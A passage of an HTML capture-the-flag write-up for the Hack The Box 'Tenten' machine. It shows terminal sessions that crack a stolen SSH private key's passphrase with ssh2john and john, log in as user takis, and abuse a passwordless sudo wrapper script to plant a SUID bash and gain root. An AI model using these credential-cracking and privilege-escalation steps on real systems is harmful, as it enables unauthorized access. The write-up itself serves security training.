+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py                                                                130 &Cross;&#13;&#10;--2021-10-05 14:33:56--  https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py&#13;&#10;Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...&#13;&#10;Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 8537 (8.3K) [text/plain]&#13;&#10;Saving to: &OpenCurlyQuote;ssh2john.py&rsquor;&#13;&#10;&#13;&#10;ssh2john.py                             100%[============================================================================&gt;]   8.34K  --.-KB/s    in 0s      &#13;&#10;&#13;&#10;2021-10-05 14:33:56 (19.0 MB/s) - &OpenCurlyQuote;ssh2john.py&rsquor; saved [8537/8537]&#13;&#10;&#13;&#10;                                                                                                                                                             &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ python ssh2john.py id_rsa &#13;&#10;id_rsa:$sshng$1$16$7265FC656C429769E4C1EEFC618E660C$1200$fc75dc501393dc98736e51fbb85f5587b7da6bbe971c876bfc2874a439c9ba78dd98b4bf95aab592e950dff445fd56b1b634f38ff57984111c2f919c1efddeb2b383952d2384c2f9de5029ae4a5ac1f6efc1b47e5f114826ecfbccb7ddfef0e8d4ab86ac2ad146c8a993269ee4a8aa942d77edb9962bd684ff87395f6c9f55338478e0dd5b4ac0a13cc6b9f5ad4e165f2b69f2d224c63e7743ecb31d9bfa393b902cf82843605369855d570e07c3cc78289ca302e22112ec993c1b3db43c9b2649d5826b317aa4812a848e0d42b9e477c9262aace4a5f5aa643cf7fa0e9fe3d1987fdeda3394d081375acb6a05aa85c758f84adc29b4b4c1aa2d9034d7ea0dbb05d2d07e77b7d146ec6a94df5c23ee7006581a5f1a8746c1e75875ee3394e04f55b36e95130a3a412bbff34288655170aea4e50b5d6f07e8ae1fba6cc8e6284e90bcc5db7ac66d434802f52259de5313274218f37f0741980eb12c358c3af1b8f5760d4218151d16de442b0d55329b4068c4ec0e7ff3254f1beb0b6c2f6c7ab00009e2b84a2d6fda1acff3df6aedce3bf0d5cd892a23df550d7fd8048c5dd7af2aa996d7b0cf6cfda30275583b4c9d60da0c4496957b53d9318a5fd135dc79500485a6f16c9663a7ec24d9e8de38c626ad4141f2575360a4d0b28df10ccd7328e85b56695a9b192b5ac7588c442d7df19d1c4645f65684ef4e5850c3be2b48f18f3041fe392164b17a7b49eff0083300a58640495c65ea835640afa9023e73e1685a052044afc6559857f292e878968ed3b27c5af56368597a3a5f415238f324b4da416cf3ead79f8cf9d49968e6da77d13f327bc17da48a96f927e1ea6407b9f45643b5b2c2dc79c7f18be6d69c63e62a8c32a94ea2b85dbcc3527d06da308275ab520b65aae6e6934c247fe974f2283b9283324fd29f65e811ee817ddb113de085834f17cbcbbe68d431f446b9b47fbec3e07bcd0b6a90d1d607900a5dd5d9386e571bef5162e5617507746bbb2805d864ab781c979f983dd7961af36b82dcef924f9401798da94fc064d83e88926b7ab8894b9e8d1292bdeff6be894f927b2f452d320754a9ffb7e7e700ef42ffc0894fd04d3853469a1a9b1c0e0d39f432fcf1dcef221c878384e57ddf715ad4125713335114f0119e378d2c57f783cb970731ccb57a15f45500a75b8ba9000ac8157942e223ec807cf8c82325749b592fe4757f6d826f55ab46b6690db8cb6e2bb34e1fc884ee4083c429cf9cf65ad275a81c3938c9de74465cf39e43e76bbe2b5dba3d15d35e2cd98447fec619d400464a5de7652eaf4f1f2095b6c324b56dd81b060c3f1bea6e14047ccfb8a9823e16a7d2e862a8aec5a11b883e7353378eb4a00a2ff9df9b32bcdb36dd3f132bbfb4ef1d4492584502e0ef502a20776a681fc96323c37a2d1fe64b9c19b2fdf4ba2154393a757aad5850efe2d129efaa95889dcdfa75f6520bf1489d6ec05f580cc1f57934b07e5cd4d413eaca68fe740cdd43489249fe6bbcca3c999eb47b0ee0e6f7c4a2e24a9c397f7e52455fab17e98ebc8504d7f62cb1730eed32ba8812170aeb8e52d3a91a22f1355448689bdb1a66b32d6092ca9b64e5f2613cb921b8af89628667f45340b9189814bdebc3eeaaa25f8aa2ace83c925e93a587472f0e484fbc0f3d72b132c83c1ead18a9fb1169cf&#13;&#10;&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ python ssh2john.py id_rsa &gt; id_rsa.john&#13;&#10;    </pre>
+
+
+    <li>Then I crack the hash using john.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john                                                                                       130 &Cross;&#13;&#10;Using default input encoding: UTF-8&#13;&#10;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&#13;&#10;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&#13;&#10;Cost 2 (iteration count) is 1 for all loaded hashes&#13;&#10;Will run 4 OpenMP threads&#13;&#10;Note: This format may emit false positives, so it will keep trying even after&#13;&#10;finding a possible candidate.&#13;&#10;Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status&#13;&#10;superpassword    (id_rsa)&#13;&#10;Warning: Only 1 candidate left, minimum 4 needed for performance.&#13;&#10;1g 0:00:00:03 DONE (2021-10-05 14:35) 0.3311g/s 4748Kp/s 4748Kc/s 4748KC/s *7&iexcl;Vamos!&#13;&#10;Session completed&#13;&#10;    </pre>
+
+    <li>John quickly finds the password "superpassword".</li>
+
+    <br>
+    
+    <li>Now we can attempt to SSH into the box.  First I will set the private key permissions to 600 so it can be used as a private key.  Then I am going to use the user "takis" since that is the only username we have found thus far.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ ssh takis@10.129.1.188 -i id_rsa&#13;&#10;Enter passphrase for key &apos;id_rsa&apos;: &#13;&#10;Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)&#13;&#10;&#13;&#10; * Documentation:  https://help.ubuntu.com&#13;&#10; * Management:     https://landscape.canonical.com&#13;&#10; * Support:        https://ubuntu.com/advantage&#13;&#10;&#13;&#10;65 packages can be updated.&#13;&#10;39 updates are security updates.&#13;&#10;&#13;&#10;&#13;&#10;Last login: Sun Sep 27 12:49:37 2020 from 10.10.14.2&#13;&#10;takis@tenten:~$ &#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>One of the first things I always check is my sudo abilities, using "sudo -l".</li>
+
+    <pre>&#13;&#10;takis@tenten:~$ sudo -l&#13;&#10;Matching Defaults entries for takis on tenten:&#13;&#10;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User takis may run the following commands on tenten:&#13;&#10;    (ALL : ALL) ALL&#13;&#10;    (ALL) NOPASSWD: /bin/fuckin&#13;&#10;    </pre>
+
+    <li>It turns out I have a couple sudo abilities.  /bin/fuckin requires no password so I will attempt to exploit that program.  I will first attempt to read the contents /bin/fuckin to see if I can see what it is doing.</li>
+
+    <pre>&#13;&#10;takis@tenten:~$ cat /bin/fuckin&amp;#13;&amp;#10;#!/bin/bash&amp;#13;&amp;#10;$1 $2 $3 $4&#13;&#10;    </pre>
+
+    <li>It appears to be a simple bash script that accepts 4 arguments.  I will create a root owned bash file with the SUID bit set in order to gain a root shell.</li>
+
+    <pre>&#13;&#10;takis@tenten:~$ sudo /bin/fuckin cp /bin/bash /tmp/rootbash ;&amp;#13;&amp;#10;takis@tenten:~$ ls -la /tmp&amp;#13;&amp;#10;total 1052&amp;#13;&amp;#10;drwxrwxrwt  9 root root    4096 Oct  5 21:41 .&amp;#13;&amp;#10;drwxr-xr-x 25 root root    4096 Apr 12  2017 ..&amp;#13;&amp;#10;drwxrwxrwt  2 root root    4096 Oct  5 18:04 .font-unix&amp;#13;&amp;#10;drwxrwxrwt  2 root root    4096 Oct  5 18:04 .ICE-unix&amp;#13;&amp;#10;-rwxr-xr-x  1 root root 1037528 Oct  5 21:41 rootbash&amp;#13;&amp;#10;drwx------  3 root root    4096 Oct  5 18:04 systemd-private-9635062439a44d2889255c5e3216fba5-systemd-timesyncd.service-SBLnYp&amp;#13;&amp;#10;drwxrwxrwt  2 root root    4096 Oct  5 18:04 .Test-unix&amp;#13;&amp;#10;drwx------  2 root root    4096 Oct  5 18:07 vmware-root&amp;#13;&amp;#10;drwxrwxrwt  2 root root    4096 Oct  5 18:04 .X11-unix&amp;#13;&amp;#10;drwxrwxrwt  2 root root    4096 Oct  5 18:04 .XIM-unix&amp;#13;&amp;#10;takis@tenten:~$ sudo /bin/fuckin chmod +s /tmp/rootbash ;&amp;#13;&amp;#10;takis@tenten:~$ cd /tmp&amp;#13;&amp;#10;takis@tenten:/tmp$ ls&amp;#13;&amp;#10;rootbash  systemd-private-9635062439a44d2889255c5e3216fba5-systemd-timesyncd.service-SBLnYp  vmware-root&amp;#13;&amp;#10;takis@tenten:/tmp$ ./rootbash -p&amp;#13;&amp;#10;rootbash-4.3# id&amp;#13;&amp;#10;uid=1000(takis) gid=1000(takis) &amp;lt;mark&amp;gt;euid=0(root) egid=0(root) groups=0(root)&amp;lt;/mark&amp;gt;,4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare),1000(takis)&amp;#13;&amp;#10;rootbash-4.3# &#13;&#10;    </pre>
+
+</body>
+</html>
+
